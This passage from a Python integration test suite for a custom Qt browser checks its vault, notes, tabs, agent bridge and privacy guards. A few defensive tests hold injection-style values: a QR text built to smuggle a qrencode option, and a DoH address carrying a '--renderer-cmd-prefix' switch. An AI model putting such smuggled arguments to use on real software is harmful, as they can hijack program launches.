                               ".length") == 0, 6000)
_off136 = jsq(_bv136, "document.querySelectorAll('span.__a11yb').length")
_text136 = jsq(_bv136, "document.querySelector('article p').textContent")
br.set_a11y("boldStarts", _bs_was136)
check("bold starts switched off give the page its own words back",
      (_on136 or 0) > 0 and _off136 == 0
      and str(_text136).startswith("Paragraph 0 of the article"),
      str((_on136, _off136, str(_text136)[:30])))
# T13 clearing a site takes its IndexedDB too, from every tab of it
H.js(_bv136, "localStorage.setItem('k136', '1');"
             "indexedDB.open('db136', 1).onsuccess = function (e) {"
             "  e.target.result.close(); window.__db136 = 1; }; 1")
H.wait_for(lambda: jsq(_bv136, "window.__db136 === 1"), 5000)
br.clear_site_data("127.0.0.1")
H.spin(1500)
H.wait_for(lambda: jsq(_bv136, "document.readyState") == "complete", 6000)
H.js(_bv136, "window.__dbs136 = null; indexedDB.databases().then("
             "function (d) { window.__dbs136 = d.map(function (x) {"
             " return x.name; }).join(','); }); 1")
H.wait_for(lambda: jsq(_bv136, "window.__dbs136 !== null"), 5000)
_dbs136 = jsq(_bv136, "window.__dbs136")
_ls136 = jsq(_bv136, "localStorage.getItem('k136')")
check("clearing a site's data takes its IndexedDB as well as its storage",
      "db136" not in str(_dbs136) and _ls136 is None,
      str((_dbs136, _ls136)))
try:
    if br.tabs.indexOf(_bv136) >= 0:
        br.close_tab(br.tabs.indexOf(_bv136), ask=False)
except RuntimeError:
    pass

# ===== notes page: the search box keeps a half-typed to-do ================
_np137 = br.new_tab(url=None); H.spin(200)
_np137.page().prime_trust(br.notes_url())
H.load(_np137, br.notes_url().toString())
H.wait_for(lambda: jsq(_np137, "!!document.getElementById('v_todo')"), 6000)
H.spin(800)
H.js(_np137, "document.getElementById('v_todo').click(); 1")
H.wait_for(lambda: jsq(_np137, "!!document.querySelector('#body input"
                               "[type=text]')"), 6000)
H.js(_np137, "var b = document.querySelector('#body input[type=text]');"
             "b.value = 'half typed 137';"
             "b.dispatchEvent(new Event('input', {bubbles: true}));"
             "var q = document.getElementById('q'); q.value = 'zz';"
             "q.dispatchEvent(new Event('input', {bubbles: true})); 1")
H.spin(1200)
H.wait_for(lambda: jsq(_np137, "!!document.querySelector('#body input"
                               "[type=text]')"), 4000)
_draft137 = jsq(_np137, "document.querySelector('#body input[type=text]')"
                        ".value")
H.js(_np137, "var q = document.getElementById('q'); q.value = '';"
             "q.dispatchEvent(new Event('input', {bubbles: true})); 1")
check("typing in the notes search box keeps a half-typed to-do",
      _draft137 == "half typed 137", str(_draft137))
try:
    if br.tabs.indexOf(_np137) >= 0:
        br.close_tab(br.tabs.indexOf(_np137), ask=False)
except RuntimeError:
    pass

# ===== eleventh pass: QR secrets, app windows, vault clock, timers ========
# V1 the QR text never goes on qrencode's command line
_qrsrc139 = __import__("inspect").getsource(B.Browser.qr_code)
_qr139 = []
_shown139 = None
if __import__("shutil").which("qrencode"):
    _real_show139 = br._show_qr
    br._show_qr = lambda image, text, then=None: _qr139.append(
        (image.isNull(), text)) or True
    try:
        _shown139 = br.qr_code("-o/tmp/x139 hello")
    finally:
        br._show_qr = _real_show139
check("a QR code's text goes to qrencode on its input, never its command line",
      '"--", text]' not in _qrsrc139 and "proc.write(" in _qrsrc139
      and (_shown139 is None or (_qr139 and _qr139[0] == (False,
                                                          "-o/tmp/x139 hello"))),
      str((_shown139, _qr139)))
# V2 a private tab opened as an app is a private window
_pv139 = br.new_tab(url=srv.url("/twhome?app139"), private=True,
                    switch=False); H.spin(300)
H.wait_for(lambda: "app139" in _pv139.url().toString(), 6000)
_aw139 = br.open_as_app(br._tab_url(_pv139), view=_pv139); H.spin(800)
_awp139 = bool(getattr(_aw139, "_all_private", False)) if _aw139 else None
check("a private tab opened as an app opens in a private window",
      _awp139 is True, str(_awp139))
# V3 an app window never writes its one site over the session
_st139 = json.dumps(br.config.get("sessionTabs"), sort_keys=True)
try:
    if _aw139 is not None:
        _aw139._save_groups(quiet=True)
except RuntimeError:
    pass
_st139b = json.dumps(br.config.get("sessionTabs"), sort_keys=True)
check("an app window does not save its site as his session",
      _st139 == _st139b)
try:
    if _aw139 is not None:
        _aw139._closing_anyway = True
        _aw139.close()
    if br.tabs.indexOf(_pv139) >= 0:
        br.close_tab(br.tabs.indexOf(_pv139), ask=False)
except RuntimeError:
    pass
H.spin(400)
# V9 the 2FA poll does not wind the auto-lock clock
_totp_src139 = __import__("inspect").getsource(B.Bridge.totpFor)
check("the once-a-second 2FA poll does not keep the vault from locking",
      "touch=False" in _totp_src139)
# V10 Ctrl+Shift+G copies as a secret, and clears it later
_gen139 = []
_real_cst139, _real_ccl139 = br._copy_secret_text, br.clear_clipboard_later
_real_vpo139 = br.vault_password_on
br._copy_secret_text = lambda text: _gen139.append("secret")
br.clear_clipboard_later = lambda *a, **k: _gen139.append("later") or True
br.vault_password_on = lambda: True
try:
    br.generate_to_clipboard()
finally:
    br._copy_secret_text, br.clear_clipboard_later = _real_cst139, _real_ccl139
    br.vault_password_on = _real_vpo139
    for _n139 in ("_copy_secret_text", "clear_clipboard_later",
                  "vault_password_on"):
        br.__dict__.pop(_n139, None)
check("Ctrl+Shift+G puts the password on the clipboard as a secret, cleared "
      "later", _gen139 == ["secret", "later"], str(_gen139))
# V18 a timer row with no sane time is dropped, and the desk tick runs
_tm_was139 = json.dumps(br.config.get("timers") or [])
br.config["timers"] = [{"name": "bad139", "at": "soon"},
                       {"name": "ok139", "at": _time.time() + 3600}]
_tick_err139 = None
try:
    br._desk_tick()
except Exception as _e139:
    _tick_err139 = repr(_e139)
_names139 = [r.get("name") for r in br.timers()]
br.config["timers"] = json.loads(_tm_was139)
check("a malformed timer row is dropped and the desk tick goes on",
      _tick_err139 is None and _names139 == ["ok139"],
      str((_tick_err139, _names139)))

# ===== eleventh pass: agent window, gestures, captions, subtitles =========
# V0 the agent bridge moves to a window that is open
import agent_bridge as _ab140
_aw140 = br.new_window(url=srv.url("/twhome?agent140")); H.spin(900)
_bridge140 = _ab140.AgentBridge(_aw140)
_aw140._closing_anyway = True
_aw140.close(); H.spin(500)
try:
    _now140 = _bridge140.win
except Exception as _e140:
    _now140 = repr(_e140)
check("the agent bridge works on an open window once its own is closed",
      _now140 is not _aw140 and _now140 in br.windows(), str(_now140))
try:
    _bridge140.server.close()
except (AttributeError, RuntimeError):
    pass
# V4 / V5 / V6 the gesture filter and the wheel step
_mw_src140 = __import__("inspect").getsource(B.MouseWatch) \
    if hasattr(B, "MouseWatch") else _Path(B.__file__).read_text()
check("right button + wheel skips hidden tabs, and a lost release does not "
      "leave a button held", "bar.isTabVisible(at)" in _mw_src140
      and "held = event.buttons()" in _mw_src140)
check("the custom wheel step leaves boxes that scroll themselves alone",
      "scrollsItself(e.target, \"y\")" in B.NAV_JS
      and "scrollsItself(e.target, \"x\")" in B.NAV_JS)
# V11 the palette's transcript menu opens once it is filled
_tv140 = br.new_tab(url=srv.url("/twhome?tr140")); H.spin(300)
H.wait_for(lambda: jsq(_tv140, "document.readyState") == "complete", 6000)
br.__dict__.pop("_media_menu_shown", None)
_tm140 = None
try:
    _tm140 = br.transcript_menu(view=_tv140, popup_at=B.QPoint(10, 10))
except TypeError as _e140:
    _tm140 = repr(_e140)
H.wait_for(lambda: getattr(br, "_media_menu_shown", None) is not None, 4000)
_shown140 = getattr(br, "_media_menu_shown", None)
_rows140 = len(_shown140.actions()) if _shown140 is not None else 0
check("the transcript menu from the palette shows up filled",
      _shown140 is not None and _rows140 >= 1, str((_tm140, _rows140)))
try:
    if _shown140 is not None:
        _shown140.close()
    if br.tabs.indexOf(_tv140) >= 0:
        br.close_tab(br.tabs.indexOf(_tv140), ask=False)
except RuntimeError:
    pass
# V12 a translated caption is taken off when its line ends
check("a translated page caption goes when the line ends",
      "clear=True" in __import__("inspect").getsource(
          B.Browser.translate_page_captions))
# V13 a German subtitle file saved on Windows keeps its umlauts
_sd140 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(_sd140 / "film.srt").write_bytes(
    "1\r\n00:00:01,000 --> 00:00:02,000\r\nGrüße aus Köln\r\n".encode("cp1252"))
_url140, _p140 = br.subtitle_data_url(str(_sd140 / "film.srt"))
import base64 as _b64_140
_vtt140 = _b64_140.b64decode(_url140.split(",", 1)[1]).decode("utf-8") \
    if _url140 else ""
check("a subtitle file saved as Windows-1252 keeps its umlauts",
      "Grüße aus Köln" in _vtt140, _vtt140[-40:])

# ===== eleventh pass: agent sockets, bookmarks, open-with, history, tabs ==
check("a finished agent connection is deleted, and an endless line dropped",
      "conn.disconnected.connect(conn.deleteLater)"
      in (_Path(B.__file__).parent / "agent_bridge.py").read_text())
# V16 a rename refused by a lock tells the page
_bm_was141 = list(br.bookmarks)
br.bookmarks.append({"id": 141001, "type": "folder", "title": "lk141",
                     "locked": True})
br.bookmarks.append({"id": 141002, "type": "link", "title": "x141",
                     "url": "https://x141.example/", "parent": 141001})
_bmc141 = []
_bmcb141 = lambda *a: _bmc141.append(1)
br.bridge.bookmarksChanged.connect(_bmcb141)
br.update_bookmark(141002, "renamed141", "https://x141.example/")
H.spin(100)
try:
    br.bridge.bookmarksChanged.disconnect(_bmcb141)
except TypeError:
    pass
_title141 = next((e["title"] for e in br.bookmarks if e.get("id") == 141002),
                 None)
br.bookmarks[:] = _bm_was141
check("a rename a lock refuses leaves the title and tells the page to redraw",
      _title141 == "x141" and len(_bmc141) >= 1, str((_title141, _bmc141)))
# V19 an open-with rule's flags reach the program
_ow_was141 = br.config.get("openWith", "__absent__")
_real_owr141 = br.open_with_rules
br.open_with_rules = lambda: {"pdf": "zathura --fork --mode 'a b'"}
try:
    _args141 = br.open_with_args("doc.pdf")
except AttributeError:
    _args141 = None
br.__dict__.pop("open_with_rules", None)
check("an open-with rule's arguments are passed to the program",
      _args141 == ["--fork", "--mode", "a b"], str(_args141))
# V22 statistics leave out the hops the list leaves out
_hist_was141 = list(br.history)
_now141 = _time.time()
br.history.append({"url": "https://real141.example/page", "t": _now141,
                   "title": "r"})
_noise141 = next((h for h in getattr(B, "NOISE_HOSTS", ()) if "." in h),
                 None)
if _noise141:
    br.history.append({"url": "https://%s/redirect?x=1" % _noise141,
                       "t": _now141, "title": "n"})
_stats141 = br.browsing_stats(days=1)
br.history[:] = _hist_was141
_hosts141 = [r["host"] for r in _stats141["sites"]]
check("browsing statistics leave out sign-in bounces and link wrappers",
      "real141.example" in _hosts141
      and (not _noise141 or not any(_noise141.endswith(h) or h.endswith(
          _noise141) for h in _hosts141)), str((_noise141, _hosts141[:5])))
# V25 a tab closed to the left is not "the tab before"
_ta141 = br.new_tab(url=srv.url("/twhome?a141")); H.spin(200)
_tb141 = br.new_tab(url=srv.url("/twhome?b141")); H.spin(200)
_tc141 = br.new_tab(url=srv.url("/twhome?c141"), switch=False); H.spin(200)
br.tabs.setCurrentWidget(_ta141); H.spin(150)
br.tabs.setCurrentWidget(_tb141); H.spin(150)
_mid141 = br.new_tab(url=srv.url("/twhome?m141"), switch=False)
br.tabs.tabBar().moveTab(br.tabs.indexOf(_mid141), br.tabs.indexOf(_tb141))
H.spin(150)
br.tabs.setCurrentWidget(_tb141); H.spin(150)
_before0_141 = getattr(br, "_tab_before", None)
br.close_tab(br.tabs.indexOf(_mid141), ask=False); H.spin(300)
check("closing a tab to the left of the one in front leaves 'the tab before'",
      br.current() is _tb141 and getattr(br, "_tab_before", None)
      is _before0_141, str((br.current() is _tb141,
                            getattr(br, "_tab_before", None) is _ta141)))
for _w141 in (_ta141, _tb141, _tc141):
    try:
        if br.tabs.indexOf(_w141) >= 0:
            br.close_tab(br.tabs.indexOf(_w141), ask=False)
    except RuntimeError:
        pass
# V29 a saved transcript keeps its milliseconds, and no cue is zero long
_sd141 = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_srt141 = br.save_subtitles([{"t": 1.25, "e": 1.25, "text": "a"},
                             {"t": 3.5, "e": 4.75, "text": "b"}],
                            path=str(_sd141 / "t.srt"))
_txt141 = (_sd141 / "t.srt").read_text() if _srt141 else ""
check("a saved transcript keeps its timing and has no zero-length cue",
      "00:00:01,250 --> 00:00:03,250" in _txt141
      and "00:00:03,500 --> 00:00:04,750" in _txt141, _txt141[:120])
# V28 / V23 the passwords page and the history page
_pwh141 = (_Path(B.__file__).parent / "passwords.html").read_text()
_hh141 = (_Path(B.__file__).parent / "history.html").read_text()
check("a vault lock forgets the Esc draft, and 'yesterday' is a calendar day",
      _pwh141.count("escDraft = null") >= 4
      and "midnight - 86400" not in _hh141)

# ===== eleventh pass: agent client, wheel volume, generator, pages =======
import importlib as _il142
_agent142 = _il142.import_module("agent")
_wf142 = getattr(_agent142, "_wait_for", None)
check("the agent client waits as long as the op it asked for",
      _wf142 is not None and _wf142({"timeout": 700000}) == 730.0
      and _wf142({"op": "tabs"}) == 60.0 and _wf142({}, 5) == 5.0)
# V20 switching wheel-over-video off reaches the open pages
_wv_was142 = br.config.get("wheelVolume", False)
_wv142 = br.new_tab(url=srv.url("/twhome?wv142")); H.spin(300)
H.wait_for(lambda: jsq(_wv142, "document.readyState") == "complete", 6000)
br.media_tool("wheelvolume", view=_wv142)
H.wait_for(lambda: jsq(_wv142, "window.__wheelVol === true",
                       B.APP_WORLD_ID), 4000)
br.bridge.setSetting("wheelVolume", "false")
H.wait_for(lambda: jsq(_wv142, "window.__wheelVolOn === false",
                       B.APP_WORLD_ID), 4000)
_off142 = jsq(_wv142, "window.__wheelVolOn", B.APP_WORLD_ID)
br.config["wheelVolume"] = _wv_was142
check("switching wheel-over-video off stops it on pages already open",
      _off142 is False, str(_off142))
try:
    if br.tabs.indexOf(_wv142) >= 0:
        br.close_tab(br.tabs.indexOf(_wv142), ask=False)
except RuntimeError:
    pass
# V27 the generator opens on his saved settings
_pg_was142 = br.config.get("pwGen", "__absent__")
br.config["pwGen"] = {"length": 40, "symbols": False, "digits": True,
                      "upper": True, "ambiguous": False}
try:
    _gc142 = json.loads(br.bridge.generatorChoice(br.bridge_key()
                                                  if hasattr(br, "bridge_key")
                                                  else "") or "{}")
except (AttributeError, TypeError):
    _gc142 = None
if _pg_was142 == "__absent__":
    br.config.pop("pwGen", None)
else:
    br.config["pwGen"] = _pg_was142
_pwh142 = (_Path(B.__file__).parent / "passwords.html").read_text()
check("the password generator opens on the settings he left it at",
      hasattr(br.bridge, "generatorChoice")
      and "bridge.generatorChoice(KEY" in _pwh142, str(_gc142))
# V24 / V17 picks and a rename in progress
_hh142 = (_Path(B.__file__).parent / "history.html").read_text()
_bh142 = (_Path(B.__file__).parent / "bookmarks.html").read_text()
check("deleted history rows drop their picks, and a redraw keeps a rename",
      "if (key === lastFilter)" in _hh142 and "editDraft" in _bh142)

# ===== twelfth pass: ad block per site, guard lists, clips, proxy names ===
# W0 blocking switched back on for a subdomain of a site that is let off
_abo_was143 = json.dumps(br.config.get("adBlockOff") or {})
_ab_was143 = br.config.get("adBlock", False)
br.config["adBlock"] = True
br.config["adBlockOff"] = {"rv143.example": True}
_before143 = br.ad_block_on("m.rv143.example")
br.ad_block_on("m.rv143.example", True)
_after143 = br.ad_block_on("m.rv143.example")
_parent143 = br.ad_block_on("rv143.example")
br.config["adBlockOff"] = json.loads(_abo_was143)
br.config["adBlock"] = _ab_was143
check("ad blocking switched on again for a subdomain of a site let off holds",
      _before143 is False and _after143 is True and _parent143 is False,
      str((_before143, _after143, _parent143)))
# W3 a protocol-relative frame from another site is dropped
_pgsrc143 = (_Path(B.__file__).parent / "page_guard.py").read_text()
check("the frame guard resolves //host frames, and watches src changes",
      "new URL(src, location.href)" in _pgsrc143
      and 'attributeFilter: ["src"]' in _pgsrc143)
# W4 letting a site open windows renews the guard script
_rg143 = []
_real_rg143 = br.refresh_guard_scripts
br.refresh_guard_scripts = lambda *a, **k: _rg143.append(1)
_pop_was143 = list(br.site_rules("popupSites"))
try:
    br.toggle_site_rule("popupSites", "pop143.example")
finally:
    br.refresh_guard_scripts = _real_rg143
    br.__dict__.pop("refresh_guard_scripts", None)
br.config["popupSites"] = _pop_was143
check("letting a site open windows renews the guard's script",
      len(_rg143) >= 1, str(_rg143))
# W5 / W6 a copy in a private window is not recorded; off clears the list
_ch_was143 = br.config.get("clipHistory", False)
br.config["clipHistory"] = True
_dk143 = br.desk()
_pw143 = br.new_private_window(); H.spin(800)
_real_aw143 = B.QApplication.activeWindow
try:
    B.QApplication.activeWindow = staticmethod(lambda: _pw143)
    _patched143 = True
except (TypeError, AttributeError):
    _patched143 = False
    _pw143.activateWindow(); H.spin(300)
_QGA.clipboard().setText("private-secret-143")
try:
    br._clipboard_changed()
finally:
    if _patched143:
        B.QApplication.activeWindow = _real_aw143
_clips143 = [c.get("text") for c in (_dk143.clips() if _dk143 else [])]
if _dk143 is not None:
    _dk143.add_clip("kept-143", "text") if hasattr(_dk143, "add_clip") else None
br.watch_clipboard(False)
_left143 = len(_dk143.clips()) if _dk143 is not None else 0
br.config["clipHistory"] = _ch_was143
try:
    _pw143._closing_anyway = True
    _pw143.close()
except RuntimeError:
    pass
H.spin(300)
check("a copy made in a private window stays out of the clip history, and "
      "switching it off empties the list",
      "private-secret-143" not in _clips143 and _left143 == 0,
      str((_clips143[:3], _left143)))
# W8 a proxy profile named "auto" is refused
_pp_was143 = json.dumps(br.config.get("proxyProfiles") or [])
br.bridge.saveProxyProfile(json.dumps({"name": "auto", "type": "http",
                                       "host": "192.0.2.10", "port": 8080}))
_names143 = [p.get("name") for p in (br.config.get("proxyProfiles") or [])
             if isinstance(p, dict)]
br.config["proxyProfiles"] = json.loads(_pp_was143)
check("a proxy profile called 'auto' is refused, like system and direct",
      "auto" not in _names143, str(_names143))

# ===== twelfth pass: LAN from blob pages, history traps, notes, pages =====
import privacy as _pv144
_blob144 = _pv144.check_request({"blockLocal": True},
                                B.QUrl("http://192.168.1.1/"),
                                B.QUrl("blob:https://evil144.example/uuid"))
_data144 = _pv144.check_request({"blockLocal": True},
                                B.QUrl("http://192.168.1.1/"),
                                B.QUrl("data:text/html,hi"))
_mine144 = _pv144.check_request({"blockLocal": True},
                                B.QUrl("http://192.168.1.1/"), None)
check("a public site's blob: or data: page cannot reach the home network; "
      "his own navigation can", _blob144[0] is False and _data144[0] is False
      and _mine144[0] is True, str((_blob144[0], _data144[0], _mine144[0])))
_nav_src144 = __import__("inspect").getsource(B.WebPage.acceptNavigationRequest) \
    if hasattr(B, "WebPage") else ""
check("cleaning tracking never re-issues Back, Forward or Reload",
      "NT.NavigationTypeReload)):" in _nav_src144)
# W17 another notes folder reloads the snippet expander
_nf_was144 = br.config.get("notesFolder", "")
_rs144 = []
_real_rs144 = br.refresh_snippet_script
br.refresh_snippet_script = lambda *a, **k: _rs144.append(1)
try:
    br.set_notes_folder(str(_Path(_tempfile.mkdtemp(
        dir=str(B.CONFIG_FILE.parent)))))
finally:
    br.refresh_snippet_script = _real_rs144
    br.__dict__.pop("refresh_snippet_script", None)
br.set_notes_folder(_nf_was144)
check("pointing the notes at another folder reloads the snippets",
      len(_rs144) >= 1, str(_rs144))
# W24 / W9 / W7 / W25 / W10
_ss_src144 = __import__("inspect").getsource(B.Bridge.setSetting)
_set144 = (_Path(B.__file__).parent / "settings.html").read_text()
_mic144 = (_Path(B.__file__).parent / "mictest.html").read_text()
_start144 = (_Path(B.__file__).parent / "start.html").read_text()
_tw144 = (_Path(B.__file__).parent / "theme_web.py").read_text()
check("the start page follows its rows' settings; the history switch, the "
      "device lists, the setup wizard and re-theming are fixed",
      '"countdowns", "agendaFile", "startRecent"' in _ss_src144
      and 'document.getElementById("histenc").onchange' in _set144
      and "const was = select.value;" in _mic144
      and "if (!bridge) maybeStartSetup();" in _start144
      and "orig.delete(all[i]);" in _tw144)

# ===== review of the whole 2ab diff, part 2 ===============================
# X9 the side buttons' off switch holds with gestures off, press and release
from PyQt6.QtGui import QMouseEvent as _QME145
from PyQt6.QtCore import QPointF as _QPF145, QObject as _QO145
_mg_was145 = br.config.get("mouseGestures", False)
_mb_was145 = br.config.get("mouseButtons", True)
br.config["mouseGestures"] = False
br.config["mouseButtons"] = False
_mw145 = B.MouseWatch(br)
_mv145 = br.new_tab(url=srv.url("/twhome?mb145"), switch=False); H.spin(200)
_obj145 = _QO145()
_mw145.views[_obj145] = _mv145
_held145 = []
for _kind145 in (B.QEvent.Type.MouseButtonPress,
                 B.QEvent.Type.MouseButtonRelease):
    _ev145 = _QME145(_kind145, _QPF145(5, 5), _QPF145(5, 5),
                     B.Qt.MouseButton.XButton1, B.Qt.MouseButton.NoButton,
                     B.Qt.KeyboardModifier.NoModifier)
    _held145.append(bool(_mw145._watch(_obj145, _ev145)))
br.config["mouseGestures"] = _mg_was145
br.config["mouseButtons"] = _mb_was145
_close_if_open(_mv145)
check("side buttons switched off are held back with gestures off, press "
      "and release", _held145 == [True, True], str(_held145))
# X7 the Settings engine text follows a dropped engine
_et_was145 = br.config.get("enginesText", "__absent__")
_oe_was145 = json.dumps(br.config.get("ownEngines") or [])
br.add_engine("Drop145", "https://drop145.example/?q=%s", "", engine_id="d145")
br.drop_engine("d145")
_text145 = str(br.config.get("enginesText") or "")
if _et_was145 == "__absent__":
    br.config.pop("enginesText", None)
else:
    br.config["enginesText"] = _et_was145
br.config["ownEngines"] = json.loads(_oe_was145)
check("a dropped engine leaves the Settings engine text too",
      "drop145" not in _text145, _text145[-120:])
# X6 terminals that wait
check("only terminals that wait for the editor are used",
      not any(n == "x-terminal-emulator" for n, _a in B.Browser.TERMINALS)
      and dict(B.Browser.TERMINALS).get("konsole", [""])[0] == "--nofork")
# X1 an update the store refused is undone
class _Refuse145:
    eager = False

    def put(self, item):
        return None

    def delete(self, item_id):
        return True


_v145 = B.PasswordVault(_Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent))))
_v145.add_item({"type": "login", "host": "imp145.example", "username": "u",
                "password": "old145", "title": "t"})
_v145.provider = _Refuse145()
try:
    _v145.import_rows("url,username,password\n"
                      "https://imp145.example/,u,new145\n")
except (TypeError, KeyError, AttributeError):
    pass
_pw145 = [i.get("password") for i in _v145.items()
          if i.get("host") == "imp145.example"]
check("an import's update the store refused leaves the login as it was",
      _pw145 == ["old145"], str(_pw145))

# ===== review of the 2ac diff: agent wait, zone labels, desk, cookies =====
_ab146 = (_Path(B.__file__).parent / "agent_bridge.py").read_text()
check("an agent wait whose client hung up stops without an exception",
      "gave_up = True" in _ab146)
_za146 = B._zone_answer("stream at 8 PM EST")
_ta146 = B._time_answer("time in est")
check("a zone typed as EST is shown as EST (UTC-5), not an inverted Etc name",
      _za146 is not None and "(UTC-5)" in _za146[0]
      and "Etc/" not in _za146[0] and _ta146 is not None
      and "EST (UTC-5)" in _ta146[0], str((_za146, _ta146)))
_src146 = _Path(B.__file__).read_text()
check("the window that takes over the session restores it first, and a "
      "parent's block leaves a subdomain he allowed",
      "_restore_as_writer = True" in _src146
      and 'self.cookie_rules().get(here) == "allow"' in _src146)
if br.desk() is not None:
    _dw146 = br.new_window(); H.spin(700)
    _same146 = _dw146.desk() is br.desk()
    try:
        _dw146._closing_anyway = True
        _dw146.close()
    except RuntimeError:
        pass
    H.spin(300)
    check("every window shares one notes drawer and clip history",
          _same146 is True, str(_same146))

# ===== thirteenth pass (security): agent pages, launch config, DoH, forget =
# Z0 the agent cannot drive the browser's own pages or local files
import agent_bridge as _ab149
_br149 = _ab149.AgentBridge(br)
_lv_was149 = br.config.get("bridgeLevel", "__absent__")
br.config["bridgeLevel"] = "full"
try:
    _own149 = _br149.allowed("open", B.QUrl.fromLocalFile(
        str(_Path(B.__file__).parent / "settings.html")).toString())
    _tabown149 = _br149.allowed("js", "", B.QUrl(B.START_PAGE).toString())
    _web149 = _br149.allowed("open", "https://ok149.example/")
    _blank149 = _br149.allowed("text", "", "about:blank")
finally:
    if _lv_was149 == "__absent__":
        br.config.pop("bridgeLevel", None)
    else:
        br.config["bridgeLevel"] = _lv_was149
    try:
        _br149.server.close()
    except (AttributeError, RuntimeError):
        pass
check("an agent can open web pages but not the browser's own pages or files",
      _own149[0] is False and _tabown149[0] is False and _web149[0] is True
      and _blank149[0] is True, str((_own149, _tabown149, _web149, _blank149)))
# Z1 a config file of the wrong shape cannot stop the start
_cf_text149 = B.CONFIG_FILE.read_text() if B.CONFIG_FILE.exists() else None
_launch149 = None
try:
    B.CONFIG_FILE.write_text("[]")
    _launch149 = B._launch_config()
finally:
    if _cf_text149 is None:
        B.CONFIG_FILE.unlink()
    else:
        B.CONFIG_FILE.write_text(_cf_text149)
_bad149 = {"proxy": "direct", "proxyProfiles": ["a", {"name": "p149",
           "type": "http", "host": "192.0.2.10", "port": 8080}],
           "proxyAuto": [], "activeProxy": ["x"]}
_err149 = None
try:
    B._migrate_proxy_config(_bad149)
    B._proxy_launch_flags(_bad149)
except Exception as _e149:
    _err149 = repr(_e149)
check("a config of the wrong shape (or wrong-typed proxy keys) does not stop "
      "the start", _launch149 == {} and _err149 is None,
      str((_launch149, _err149)))
# Z2 a DoH address with a space in it is not a second engine switch
_evil149 = B._privacy_flags({"doh": True, "dohUrl":
                             "https://x149/dns --renderer-cmd-prefix=/tmp/e"})
_good149 = B._privacy_flags({"doh": True, "dohUrl": "https://dns149.example/q"})
check("a DoH address that would smuggle a switch is refused",
      not any("renderer-cmd-prefix" in f for f in _evil149)
      and not any("dns-over-https" in f for f in _evil149)
      and any("dns149.example" in f for f in _good149),
      str((_evil149, _good149)))
# Z3 forgetting a site forgets this run's grants for it
_key149 = "https://meet149.example|use the microphone"
_sp149 = getattr(br, "_session_perms", None)
if isinstance(_sp149, dict):
    _sp149[_key149] = True
_perms_was149 = json.dumps(br.config.get("permissions") or {})
br.config.setdefault("permissions", {})[_key149] = True
br.forget_site("meet149.example")
_left149 = isinstance(_sp149, dict) and _key149 in _sp149
br.config["permissions"] = json.loads(_perms_was149)
if isinstance(_sp149, dict):
    _sp149.pop(_key149, None)
check("forgetting a site takes back this run's answers for it too",
      _sp149 is not None and not _left149, str((_sp149 is not None, _left149)))
# ===== thirteenth pass (security), part 2 ================================
import privacy as _pv150


class _Pg150:
    def __init__(self, own, opener=None):
        self._own = B.QUrl(own)
        if opener is not None:
            self._opener_url = B.QUrl(opener)

    def url(self):
        return self._own


_lan150 = B.QUrl("http://192.168.1.1/")
_r1 = _pv150.check_request({"blockLocal": True}, _lan150,
                           B._page_for_check(_Pg150("", "https://evil150.example/")))
_r2 = _pv150.check_request({"blockLocal": True}, _lan150,
                           B._page_for_check(_Pg150("about:blank",
                                                    "http://192.168.1.5/")))
_r3 = _pv150.check_request({"blockLocal": True}, _lan150,
                           B._page_for_check(_Pg150("about:blank")))
check("a tab a public page opened cannot reach the home network; one the "
      "router's own page opened can; a blank page nobody is known to have "
      "opened counts as made by a page", _r1[0] is False and _r2[0] is True
      and _r3[0] is False, str((_r1[0], _r2[0], _r3[0])))
_tab150 = br.new_tab(); H.spin(500)
# a web page first: from the start page a web address is bounced to the
# other web channel before anything else is asked
H.load(_tab150, srv.url("/urltext"))
H.wait_for(lambda: "urltext" in _tab150.url().toString(), 8000)
_pg150 = _tab150.page()
_NT150 = B.QWebEnginePage.NavigationType
_pg150._nav_hop = B.QUrl("https://public150.example/")
_bad150 = _pg150.acceptNavigationRequest(
    B.QUrl("http://192.168.1.1/login"), _NT150.NavigationTypeRedirect, True)
_pg150._nav_hop = B.QUrl("http://192.168.1.1/")
_ok150 = _pg150.acceptNavigationRequest(
    B.QUrl("http://192.168.1.1/login"), _NT150.NavigationTypeRedirect, True)
_close_if_open(_tab150)
check("a redirect is checked against the address it comes from: a public "
      "site cannot bounce the tab to the router, the router can send it to "
      "its own login", _bad150 is False and _ok150 is True,
      str((_bad150, _ok150)))
check("a look-alike behind www. or login. is flagged, the real site's own "
      "subdomains are not", B.lookalike_warning("www.paypa1.com")
      == "looks:paypal.com" and B.lookalike_warning("login.arnazon.com")
      == "looks:amazon.com" and B.lookalike_warning("learn.microsoft.com")
      == "" and B.lookalike_warning("mail.google.com") == "")
import agent_bridge as _ab150
check("the agent's cookie host must be a bare host name",
      _ab150.AgentBridge._clean_host("allowed.com/.com") is None
      and _ab150.AgentBridge._clean_host("www.Example.com") == "example.com"
      and _ab150.AgentBridge._clean_host("") == "")
import notes as _nt150
_np150 = _nt150.parse_note("---\nt: inf\nedited: 1e999\ntitle: x\n---\nbody\n") \
    if hasattr(_nt150, "parse_note") else None
check("a note dated 'inf' is read as having no date, not a broken list",
      _np150 is not None and _np150.get("t") == 0
      and _np150.get("edited") == 0, str(_np150))
# Z8 / Z9 a throwaway browser leaves no host in the bar's memory
_kh150 = set(br.known_hosts)
class _V150:
    session = "main"
    no_history = True      # a tab he paused the history for
check("a throwaway browser's or a paused tab's sites are not noted",
      br._history_may_note(_V150(), "x150.example") is False)
br.known_hosts = _kh150
# Z10 the window's saved state has no addresses
_wsk150 = br.config.get("windowStates")
br.config["windowStates"] = {"other150": {"x": 1, "y": 1, "w": 800, "h": 600,
                                          "tabs": ["https://s150.example/"]}}
_ws150 = br.save_window_state()
_other150 = dict(br.config["windowStates"].get("other150") or {})
if _wsk150 is None:
    br.config.pop("windowStates", None)
else:
    br.config["windowStates"] = _wsk150
check("the window state written at quit holds its place, not its addresses "
      "(an older row of another virtual browser loses them too)",
      "tabs" not in _ws150 and "tabs" not in _other150
      and _other150.get("w") == 800, str((sorted(_ws150), _other150)))
# ===== thirteenth pass (security), part 3: vault clock, windows, history =
check("the auto-lock clock keeps counting while the machine sleeps",
      "_awake_clock()" in __import__("inspect").getsource(B.VaultLock.idle))
_vw151 = br.new_window(); H.spin(700)
br.vault = br.make_vault()
br._vault_changed()
_same151 = _vw151.vault is br.vault
try:
    _vw151._closing_anyway = True
    _vw151.close()
except RuntimeError:
    pass
